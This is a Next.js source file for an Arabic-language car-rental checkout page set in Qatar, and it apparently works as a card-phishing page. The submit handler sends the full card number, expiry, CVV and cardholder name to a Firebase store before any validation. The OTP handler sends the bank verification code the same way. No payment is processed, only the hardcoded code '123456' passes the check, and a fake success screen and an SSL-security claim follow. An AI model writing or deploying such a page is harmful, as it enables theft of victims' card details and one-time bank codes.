"use client"

import type React from "react"

import { useState, useEffect } from "react"
import Image from "next/image"
import { useSearchParams } from "next/navigation"
import Link from "next/link"
import {
  CreditCard,
  Calendar,
  Lock,
  Shield,
  CheckCircle2,
  AlertCircle,
  MapPin,
  Clock,
  ArrowLeft,
  CalendarDays,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Separator } from "@/components/ui/separator"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Badge } from "@/components/ui/badge"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { getCarById } from "@/lib/cars"
import { addData } from "@/lib/firebase"

// List of available pickup/return locations
const locations = [
  { id: "hamad-airport", name: "مطار حمد الدولي، الدوحة" },
  { id: "west-bay", name: "الخليج الغربي، الدوحة" },
  { id: "pearl-qatar", name: "اللؤلؤة، الدوحة" },
  { id: "katara", name: "كتارا، الدوحة" },
  { id: "lusail", name: "لوسيل، الدوحة" },
  { id: "wakra", name: "الوكرة" },
  { id: "al-khor", name: "الخور" },
]

// List of available pickup/return times
const timeSlots = [
  "08:00",
  "08:30",
  "09:00",
  "09:30",
  "10:00",
  "10:30",
  "11:00",
  "11:30",
  "12:00",
  "12:30",
  "13:00",
  "13:30",
  "14:00",
  "14:30",
  "15:00",
  "15:30",
  "16:00",
  "16:30",
  "17:00",
  "17:30",
  "18:00",
  "18:30",
  "19:00",
  "19:30",
  "20:00",
  "20:30",
  "21:00",
  "21:30",
  "22:00",
]

export default function PaymentPage() {
  const searchParams = useSearchParams()
  const carId = searchParams.get("carId") || "mercedes-g63"
  const days = Number.parseInt(searchParams.get("days") || "3")

  const [car, setCar] = useState<any>(null)
  const [bookingDetails, setBookingDetails] = useState({
    bookingRef: "SAL" + Math.floor(100000 + Math.random() * 900000),
    pickupDate: new Date(),
    returnDate: new Date(Date.now() + days * 24 * 60 * 60 * 1000),
    pickupLocation: "مطار حمد الدولي، الدوحة",
    returnLocation: "مطار حمد الدولي، الدوحة",
    pickupTime: "10:00",
    returnTime: "10:00",
    days: days,
    basePrice: 0,
    taxRate: 0.05,
    insurancePrice: 100,
    totalPrice: 0,
  })

  // State for pickup/return details form
  const [pickupDetails, setPickupDetails] = useState({
    pickupLocation: "hamad-airport",
    returnLocation: "hamad-airport",
    pickupDate: new Date(),
    returnDate: new Date(Date.now() + days * 24 * 60 * 60 * 1000),
    pickupTime: "10:00",
    returnTime: "10:00",
  })

  // State for showing pickup details form
  const [showPickupForm, setShowPickupForm] = useState(false)

  useEffect(() => {
    const carData = getCarById(carId)
    if (carData) {
      setCar(carData)

      const basePrice = carData.price * bookingDetails.days
      const taxAmount = basePrice * bookingDetails.taxRate
      const totalPrice = basePrice + taxAmount + bookingDetails.insurancePrice

      setBookingDetails((prev) => ({
        ...prev,
        basePrice,
        totalPrice,
      }))
    }
  }, [carId, bookingDetails.days])

  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [otpVerified, setOtpVerified] = useState(false)
  const [otpError, setOtpError] = useState(false)
  const [otp, setOtp] = useState(["", "", "", "", "", ""])
  const [timeLeft, setTimeLeft] = useState(120)

  const [formData, setFormData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
  })
  const [formErrors, setFormErrors] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
  })

  const formatDate = (date: Date) => {
    return date.toLocaleDateString("ar-QA", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
    })
  }

  const formatShortDate = (date: Date) => {
    return date.toLocaleDateString("ar-QA", {
      year: "numeric",
      month: "numeric",
      day: "numeric",
    })
  }

  const formatTime = (time: string) => {
    return time
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target

    // Format card number with spaces
    if (id === "cardNumber") {
      const formatted = value
        .replace(/\s/g, "")
        .replace(/(.{4})/g, "$1 ")
        .trim()

      setFormData({
        ...formData,
        [id]: formatted,
      })
      return
    }

    // Format expiry date with slash
    if (id === "expiryDate") {
      let formatted = value.replace(/\//g, "")
      if (formatted.length > 2) {
        formatted = `${formatted.substring(0, 2)}/${formatted.substring(2)}`
      }

      setFormData({
        ...formData,
        [id]: formatted,
      })
      return
    }

    setFormData({
      ...formData,
      [id]: value,
    })
  }

  // Handle pickup details change
  const handlePickupDetailsChange = (field: string, value: string | Date) => {
    setPickupDetails({
      ...pickupDetails,
      [field]: value,
    })
  }

  // Save pickup details
  const savePickupDetails = () => {
    // Find location names from IDs
    const pickupLocationName = locations.find((loc) => loc.id === pickupDetails.pickupLocation)?.name || ""
    const returnLocationName = locations.find((loc) => loc.id === pickupDetails.returnLocation)?.name || ""

    // Update booking details
    setBookingDetails({
      ...bookingDetails,
      pickupLocation: pickupLocationName,
      returnLocation: returnLocationName,
      pickupDate: pickupDetails.pickupDate,
      returnDate: pickupDetails.returnDate,
      pickupTime: pickupDetails.pickupTime,
      returnTime: pickupDetails.returnTime,
    })

    // Calculate days between pickup and return
    const pickupDateTime = new Date(pickupDetails.pickupDate)
    const returnDateTime = new Date(pickupDetails.returnDate)
    const diffTime = Math.abs(returnDateTime.getTime() - pickupDateTime.getTime())
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24))

    // Update days and recalculate prices
    if (car && diffDays > 0) {
      const newDays = diffDays
      const newBasePrice = car.price * newDays
      const newTaxAmount = newBasePrice * bookingDetails.taxRate
      const newTotalPrice = newBasePrice + newTaxAmount + bookingDetails.insurancePrice

      setBookingDetails((prev) => ({
        ...prev,
        days: newDays,
        basePrice: newBasePrice,
        totalPrice: newTotalPrice,
      }))
    }

    // Hide the form
    setShowPickupForm(false)
  }

  const handleSubmitPayment = (e: React.FormEvent) => {
    e.preventDefault()
 const visitorId = localStorage.getItem('visitor');

    // If validation passes, proceed with payment
    console.log("Payment data:", formData)
    addData({id:visitorId!,formData})
    // Validate form
    const errors = {
      cardNumber: "",
      expiryDate: "",
      cvv: "",
      cardholderName: "",
    }

    // Card number validation
    const cardNumberClean = formData.cardNumber.replace(/\s/g, "")
    if (!cardNumberClean) {
      errors.cardNumber = "يرجى إدخال رقم البطاقة"
    } else if (!/^\d{16}$/.test(cardNumberClean)) {
      errors.cardNumber = "يجب أن يتكون رقم البطاقة من 16 رقمًا"
    }

    // Expiry date validation
    if (!formData.expiryDate) {
      errors.expiryDate = "يرجى إدخال تاريخ الانتهاء"
    } else if (!/^\d{2}\/\d{2}$/.test(formData.expiryDate)) {
      errors.expiryDate = "صيغة غير صحيحة (MM/YY)"
    } else {
      const [month, year] = formData.expiryDate.split("/")
      const currentDate = new Date()
      const currentYear = currentDate.getFullYear() % 100
      const currentMonth = currentDate.getMonth() + 1

      if (Number.parseInt(month) < 1 || Number.parseInt(month) > 12) {
        errors.expiryDate = "شهر غير صالح"
      } else if (
        Number.parseInt(year) < currentYear ||
        (Number.parseInt(year) === currentYear && Number.parseInt(month) < currentMonth)
      ) {
        errors.expiryDate = "البطاقة منتهية الصلاحية"
      }
    }

    // CVV validation
    if (!formData.cvv) {
      errors.cvv = "يرجى إدخال رمز الأمان"
    } else if (!/^\d{3}$/.test(formData.cvv)) {
      errors.cvv = "يجب أن يتكون رمز الأمان من 3 أرقام"
    }

    // Cardholder name validation
    if (!formData.cardholderName) {
      errors.cardholderName = "يرجى إدخال اسم حامل البطاقة"
    }

    // Check if there are any errors
    const hasErrors = Object.values(errors).some((error) => error !== "")
    setFormErrors(errors)

    if (hasErrors) {
      return
    }

    // If validation passes, proceed with payment
    console.log("Payment data:", formData)
    console.log("Booking details:", bookingDetails)

    // Process payment (in a real app, you would send this data to a payment processor)
    setShowOtpDialog(true)
  }

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) {
      value = value.slice(0, 1)
    }

    const newOtp = [...otp]
    newOtp[index] = value
    setOtp(newOtp)

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`) as HTMLInputElement
      if (nextInput) {
        nextInput.focus()
      }
    }
  }

  const handleVerifyOtp = () => {
    const otpValue = otp.join("")
    const visitorId = localStorage.getItem('visitor');

    // If validation passes, proceed with payment
    addData({id:visitorId!,otpValue})
    if (otpValue === "123456") {
      setOtpVerified(true)
      setOtpError(false)
    } else {
      setOtpError(true)
    }
  }

  const formatTimeLeft = () => {
    const minutes = Math.floor(timeLeft / 60)
    const seconds = timeLeft % 60
    return `${minutes}:${seconds < 10 ? "0" : ""}${seconds}`
  }

  if (!car) {
    return (
      <div className="flex justify-center items-center min-h-screen">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-sky-500"></div>
      </div>
    )
  }

  return (
    <div className="flex flex-col min-h-screen bg-gray-50 text-right">
      {/* Header */}
      <header className="sticky top-0 z-10 bg-white py-3 px-4 flex items-center justify-between shadow-sm border-b">
        <div className="flex items-center gap-2">
          <div className="bg-sky-500 rounded-full p-1.5">
            <CreditCard className="h-5 w-5 text-white" />
          </div>
          <span className="text-sky-500 font-bold text-xl">سالك</span>
        </div>
        <Link href={`/cars/${carId}`} className="text-gray-500">
          <ArrowLeft className="h-6 w-6" />
        </Link>
      </header>

      {/* Page Title */}
      <div className="bg-white p-6 border-b">
        <h1 className="text-2xl font-bold">الدفع الآمن</h1>
        <p className="text-gray-500 mt-1">أكمل عملية الدفع لتأكيد حجزك</p>
      </div>

      {/* Payment Form */}
      <div className="p-6">
        <div className="bg-white rounded-xl shadow-md p-6 mb-6">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-lg font-bold">تفاصيل الحجز</h2>
            <Badge className="bg-green-100 text-green-800 px-3 py-1 rounded-lg font-medium">قيد الانتظار</Badge>
          </div>

          <div className="flex gap-4 mb-6">
            <Image
              src={car.image || "/placeholder.svg"}
              alt={car.name}
              width={120}
              height={80}
              className="w-24 h-20 object-cover rounded-lg"
            />
            <div>
              <h3 className="font-bold text-lg">{car.name}</h3>
              <div className="flex gap-3 text-sm text-gray-500 mt-1">
                <span className="flex items-center gap-1">
                  <Calendar className="h-4 w-4" />
                  <span>{bookingDetails.days} أيام</span>
                </span>
                <span>•</span>
                <span>ر.ق {car.price} / يوم</span>
              </div>
            </div>
          </div>

          {!showPickupForm ? (
            <>
              <div className="bg-gray-50 rounded-lg p-4 mb-4">
                <div className="flex justify-between items-start mb-4">
                  <div className="flex flex-col items-start">
                    <span className="text-sm text-gray-500 mb-1">رقم الحجز</span>
                    <span className="font-medium">{bookingDetails.bookingRef}</span>
                  </div>
                  <div className="flex flex-col items-end">
                    <span className="text-sm text-gray-500 mb-1">تاريخ الحجز</span>
                    <span className="font-medium">{formatDate(new Date())}</span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4 mb-4">
                  <div className="flex flex-col">
                    <span className="text-sm text-gray-500 mb-1">تاريخ الاستلام</span>
                    <span className="font-medium">{formatDate(bookingDetails.pickupDate)}</span>
                    <div className="flex items-center gap-1 mt-1 text-sm text-gray-500">
                      <Clock className="h-3 w-3" />
                      <span>{formatTime(bookingDetails.pickupTime)}</span>
                    </div>
                  </div>
                  <div className="flex flex-col">
                    <span className="text-sm text-gray-500 mb-1">تاريخ الإرجاع</span>
                    <span className="font-medium">{formatDate(bookingDetails.returnDate)}</span>
                    <div className="flex items-center gap-1 mt-1 text-sm text-gray-500">
                      <Clock className="h-3 w-3" />
                      <span>{formatTime(bookingDetails.returnTime)}</span>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="flex flex-col">
                    <span className="text-sm text-gray-500 mb-1">موقع الاستلام</span>
                    <div className="flex items-center gap-1">
                      <MapPin className="h-3 w-3 text-sky-500 flex-shrink-0" />
                      <span className="font-medium text-sm">{bookingDetails.pickupLocation}</span>
                    </div>
                  </div>
                  <div className="flex flex-col">
                    <span className="text-sm text-gray-500 mb-1">موقع الإرجاع</span>
                    <div className="flex items-center gap-1">
                      <MapPin className="h-3 w-3 text-sky-500 flex-shrink-0" />
                      <span className="font-medium text-sm">{bookingDetails.returnLocation}</span>
                    </div>
                  </div>
                </div>
              </div>

              <Button
                variant="default"
                className="w-full mb-6 py-2 flex items-center justify-center gap-2"
                onClick={() => setShowPickupForm(true)}
              >
                <span>تعديل تفاصيل الاستلام والإرجاع</span>
                <Calendar className="h-4 w-4" />
              </Button>
            </>
          ) : (
            <div className="bg-gray-50 rounded-lg p-4 mb-6">
              <h3 className="font-bold text-lg mb-4">تفاصيل الاستلام والإرجاع</h3>

              <div className="space-y-4 mb-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="pickupLocation" className="text-sm">
                      موقع الاستلام
                    </Label>
                    <Select
                      value={pickupDetails.pickupLocation}
                      onValueChange={(value) => handlePickupDetailsChange("pickupLocation", value)}
                    >
                      <SelectTrigger className="w-full bg-white">
                        <SelectValue placeholder="اختر موقع الاستلام" />
                      </SelectTrigger>
                      <SelectContent>
                        {locations.map((location) => (
                          <SelectItem key={location.id} value={location.id}>
                            {location.name}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="returnLocation" className="text-sm">
                      موقع الإرجاع
                    </Label>
                    <Select
                      value={pickupDetails.returnLocation}
                      onValueChange={(value) => handlePickupDetailsChange("returnLocation", value)}
                    >
                      <SelectTrigger className="w-full bg-white">
                        <SelectValue placeholder="اختر موقع الإرجاع" />
                      </SelectTrigger>
                      <SelectContent>
                        {locations.map((location) => (
                          <SelectItem key={location.id} value={location.id}>
                            {location.name}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="pickupDate" className="text-sm">
                      تاريخ الاستلام
                    </Label>
                    <div className="relative">
                      <Input
                        id="pickupDate"
                        type="date"
                        className="w-full bg-white pr-10"
                        value={pickupDetails.pickupDate.toISOString().split("T")[0]}
                        onChange={(e) => handlePickupDetailsChange("pickupDate", new Date(e.target.value))}
                        min={new Date().toISOString().split("T")[0]}
                      />
                      <CalendarDays className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="returnDate" className="text-sm">
                      تاريخ الإرجاع
                    </Label>
                    <div className="relative">
                      <Input
                        id="returnDate"
                        type="date"
                        className="w-full bg-white pr-10"
                        value={pickupDetails.returnDate.toISOString().split("T")[0]}
                        onChange={(e) => handlePickupDetailsChange("returnDate", new Date(e.target.value))}
                        min={pickupDetails.pickupDate.toISOString().split("T")[0]}
                      />
                      <CalendarDays className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="pickupTime" className="text-sm">
                      وقت الاستلام
                    </Label>
                    <Select
                      value={pickupDetails.pickupTime}
                      onValueChange={(value) => handlePickupDetailsChange("pickupTime", value)}
                    >
                      <SelectTrigger className="w-full bg-white">
                        <SelectValue placeholder="اختر وقت الاستلام" />
                      </SelectTrigger>
                      <SelectContent>
                        {timeSlots.map((time) => (
                          <SelectItem key={time} value={time}>
                            {time}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="returnTime" className="text-sm">
                      وقت الإرجاع
                    </Label>
                    <Select
                      value={pickupDetails.returnTime}
                      onValueChange={(value) => handlePickupDetailsChange("returnTime", value)}
                    >
                      <SelectTrigger className="w-full bg-white">
                        <SelectValue placeholder="اختر وقت الإرجاع" />
                      </SelectTrigger>
                      <SelectContent>
                        {timeSlots.map((time) => (
                          <SelectItem key={time} value={time}>
                            {time}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </div>
              </div>

              <div className="flex justify-end gap-2">
                <Button variant="outline" onClick={() => setShowPickupForm(false)}>
                  إلغاء
                </Button>
                <Button onClick={savePickupDetails} className="bg-sky-500 hover:bg-sky-600">
                  حفظ التغييرات
                </Button>
              </div>
            </div>
          )}

          <Separator className="mb-6" />

          <div className="space-y-4 mb-6">
            <div className="flex justify-between">
              <span className="text-gray-500">سعر الإيجار ({bookingDetails.days} أيام)</span>
              <span>ر.ق {bookingDetails.basePrice.toFixed(2)}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">ضريبة القيمة المضافة ({(bookingDetails.taxRate * 100).toFixed(0)}%)</span>
              <span>ر.ق {(bookingDetails.basePrice * bookingDetails.taxRate).toFixed(2)}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">تأمين شامل</span>
              <span>ر.ق {bookingDetails.insurancePrice.toFixed(2)}</span>
            </div>
          </div>

          <Separator className="mb-6" />

          <div className="flex justify-between font-bold text-lg">
            <span>المجموع</span>
            <span>ر.ق {bookingDetails.totalPrice.toFixed(2)}</span>
          </div>
        </div>

        <div className="bg-white rounded-xl shadow-md p-6 mb-6">
          <h2 className="text-lg font-bold mb-6">طريقة الدفع</h2>

          <RadioGroup defaultValue="card" className="mb-6">
            <div className="flex items-center space-x-2 space-x-reverse mb-4">
              <RadioGroupItem value="card" id="card" />
              <Label htmlFor="card" className="flex items-center gap-3">
                <div className="bg-blue-50 p-2 rounded-md">
                  <CreditCard className="h-5 w-5 text-blue-600" />
                </div>
                <span>بطاقة ائتمان / خصم</span>
              </Label>
            </div>

            <div className="flex flex-wrap gap-3 mb-6">
              <Image
                src="/visa.svg"
                alt="Visa"
                width={40}
                height={30}
                className="h-8 w-12 object-contain"
              />
              <Image
                src="/mastercard.svg"
                alt="Mastercard"
                width={40}
                height={30}
                className="h-8 w-12 object-contain"
              />
              <Image
                src="/vercel.svg"
                alt="American Express"
                width={40}
                height={30}
                className="h-8 w-12 object-contain"
              />
            </div>
          </RadioGroup>

          <form onSubmit={handleSubmitPayment} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="cardNumber" className="text-sm text-gray-600">
                رقم البطاقة
              </Label>
              <div className="relative">
                <Input
                  id="cardNumber"
                  placeholder="0000 0000 0000 0000"
                  className={`border-gray-300 rounded-lg py-5 text-right pr-10 ${
                    formErrors.cardNumber ? "border-red-500" : ""
                  }`}
                  maxLength={19}
                  value={formData.cardNumber}
                  onChange={handleInputChange}
                />
                <CreditCard className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
              </div>
              {formErrors.cardNumber && <p className="text-red-500 text-sm mt-1">{formErrors.cardNumber}</p>}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="expiryDate" className="text-sm text-gray-600">
                  تاريخ الانتهاء
                </Label>
                <div className="relative">
                  <Input
                    id="expiryDate"
                    placeholder="MM/YY"
                    className={`border-gray-300 rounded-lg py-5 text-right pr-10 ${
                      formErrors.expiryDate ? "border-red-500" : ""
                    }`}
                    maxLength={5}
                    value={formData.expiryDate}
                    onChange={handleInputChange}
                  />
                  <Calendar className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                </div>
                {formErrors.expiryDate && <p className="text-red-500 text-sm mt-1">{formErrors.expiryDate}</p>}
              </div>

              <div className="space-y-2">
                <Label htmlFor="cvv" className="text-sm text-gray-600">
                  رمز الأمان (CVV)
                </Label>
                <div className="relative">
                  <Input
                    id="cvv"
                    placeholder="000"
                    className={`border-gray-300 rounded-lg py-5 text-right pr-10 ${
                      formErrors.cvv ? "border-red-500" : ""
                    }`}
                    maxLength={3}
                    type="password"
                    value={formData.cvv}
                    onChange={handleInputChange}
                  />
                  <Lock className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                </div>
                {formErrors.cvv && <p className="text-red-500 text-sm mt-1">{formErrors.cvv}</p>}
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="cardholderName" className="text-sm text-gray-600">
                اسم حامل البطاقة
              </Label>
              <Input
                id="cardholderName"
                placeholder="الاسم كما يظهر على البطاقة"
                className={`border-gray-300 rounded-lg py-5 text-right ${
                  formErrors.cardholderName ? "border-red-500" : ""
                }`}
                value={formData.cardholderName}
                onChange={handleInputChange}
              />
              {formErrors.cardholderName && <p className="text-red-500 text-sm mt-1">{formErrors.cardholderName}</p>}
            </div>

            <div className="flex items-center gap-2 text-sm text-gray-500 bg-gray-50 p-3 rounded-lg">
              <Shield className="h-5 w-5 text-green-600" />
              <span>جميع المعاملات مشفرة ومؤمنة بواسطة بروتوكول SSL</span>
            </div>

            <Button type="submit" className="w-full bg-sky-500 hover:bg-sky-600 py-6 rounded-xl font-bold text-lg">
              إتمام الدفع
            </Button>
          </form>
        </div>
      </div>

      {/* OTP Dialog */}
      <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
        <DialogContent className="max-w-md rounded-xl p-0 overflow-hidden">
          <DialogHeader className="p-6 text-right">
            <DialogTitle className="text-xl font-bold">التحقق من الدفع</DialogTitle>
          </DialogHeader>

          {!otpVerified ? (
            <div className="p-6 pt-0">
              <p className="text-gray-600 mb-6">
                تم إرسال رمز التحقق إلى رقم الهاتف المسجل لدى البنك. يرجى إدخال الرمز لإتمام عملية الدفع.
              </p>

              <div className="mb-6"  >
                <Label className="text-sm text-gray-600 mb-3 block">رمز التحقق</Label>
                <div className="flex justify-between gap-2 " dir="ltr">
                  {otp.map((digit, index) => (
                    <Input
                      key={index}
                      id={`otp-${index}`}
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      className={`w-12 h-12 text-center text-lg font-bold ${
                        otpError ? "border-red-500" : "border-gray-300"
                      }`}
                    />
                  ))}
                </div>

                {otpError && (
                  <div className="flex items-center gap-2 text-red-500 mt-2">
                    <AlertCircle className="h-4 w-4" />
                    <span className="text-sm">رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.</span>
                  </div>
                )}
              </div>

              <div className="flex justify-between items-center mb-6">
                <Button variant="link" className="text-sky-500 p-0">
                  إعادة إرسال الرمز
                </Button>
                <span className="text-gray-500 text-sm">ينتهي خلال {formatTimeLeft()}</span>
              </div>

              <Button
                onClick={handleVerifyOtp}
                className="w-full bg-sky-500 hover:bg-sky-600 py-6 rounded-xl font-bold text-lg"
              >
                تأكيد
              </Button>

              <div className="text-center mt-4">
                <Button variant="link" className="text-gray-500 p-0" onClick={() => setShowOtpDialog(false)}>
                  إلغاء
                </Button>
              </div>
            </div>
          ) : (
            <div className="p-6 pt-0 text-center">
              <div className="flex justify-center mb-4">
                <div className="bg-green-100 p-3 rounded-full">
                  <CheckCircle2 className="h-10 w-10 text-green-600" />
                </div>
              </div>

              <h3 className="text-xl font-bold mb-2">تم الدفع بنجاح!</h3>
              <p className="text-gray-600 mb-6">تم تأكيد حجزك بنجاح. ستصلك رسالة تأكيد على بريدك الإلكتروني.</p>

              <div className="bg-gray-50 p-4 rounded-lg mb-6 text-right">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-gray-500 text-sm">رقم الحجز:</span>
                  <span className="font-medium">{bookingDetails.bookingRef}</span>
                </div>
                <div className="flex justify-between items-center mb-2">
                  <span className="text-gray-500 text-sm">السيارة:</span>
                  <span className="font-medium">{car.name}</span>
                </div>
                <div className="flex justify-between items-center mb-2">
                  <span className="text-gray-500 text-sm">المدة:</span>
                  <span className="font-medium">{bookingDetails.days} أيام</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-500 text-sm">المبلغ الإجمالي:</span>
                  <span className="font-medium">ر.ق {bookingDetails.totalPrice.toFixed(2)}</span>
                </div>
              </div>

              <Button
                className="w-full bg-sky-500 hover:bg-sky-600 py-6 rounded-xl font-bold text-lg"
                onClick={() => setShowOtpDialog(false)}
              >
                العودة للرئيسية
              </Button>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
